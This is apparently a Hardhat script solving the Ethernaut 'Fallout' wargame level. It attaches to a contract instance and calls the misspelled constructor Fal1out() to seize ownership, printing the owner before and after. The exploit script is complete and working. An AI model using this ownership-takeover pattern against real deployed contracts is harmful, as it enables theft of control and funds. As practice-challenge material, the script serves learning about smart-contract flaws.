import { ethers } from "hardhat";
import { Fallout__factory } from "../typechain/factories/contracts/Fallout__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x5698d91E16fc0Cb5B264F74756987f9A33143a45";
    let fallout = new Fallout__factory(signer).attach(instance_address);
    console.log(await fallout.owner());
    

    let tx = await fallout.Fal1out();
    await tx.wait();
    console.log(await fallout.owner());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
